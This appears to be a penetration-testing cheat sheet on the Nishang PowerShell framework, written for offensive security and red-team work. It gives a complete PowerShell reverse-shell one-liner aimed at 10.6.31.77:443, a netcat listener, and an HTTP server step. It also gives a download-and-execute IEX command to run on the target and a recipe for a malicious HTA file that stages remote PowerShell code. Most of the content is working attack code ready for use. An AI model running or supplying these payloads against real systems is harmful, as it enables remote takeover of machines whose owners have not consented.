# [nishang](https://github.com/samratashok/nishang)

> Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.

---

## Non-Interactive Command Execution --> Reverse Shell

Start a reverse shell listener.

```bash
sudo nc -nlvp 443 -s 10.6.31.77
```

Make a copy of `nishang/Shells/Invoke-PowerShellTcpOneLine.ps1`, choose and uncomment one of the two options, change its host and port to that of your reverse shell listener, and delete the other.

```powershell
# shell.ps1
$client = New-Object System.Net.Sockets.TCPClient('10.6.31.77',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Serve the reverse shell.

```bash
python3 -m http.server 80
```

Execute the following command on the target to execute the reverse shell.

```cmd
powershell "IEX(New-Object System.Net.WebClient).downloadString('http://10.6.31.77/shell.ps1')"
```

**Note** that if you're having trouble escaping the quotiation marks, you can [[powershell#Execute Base64 Encoded Command|base64 encode the command and execute it that way]].

Receive the reverse shell.

---

## Generate a Malicious HTA Document that Stages & Executes Remote PowerShell Code

Enter a PowerShell session on the attacking machine and source `nishang/Client/Out-HTA.ps1`.

```powershell
. nishang/Client/Out-HTA.ps1
```

Generate the malicious HTA document. Note that while this option stages PowerShell code from a remote URL, there are other options (`Get-Help Out-HTA`).

```powershell
Out-HTA -PayloadUrl $PAYLOAD_URL -HTAFilePath $OUTPUT_HTA_FILE_PATH
```
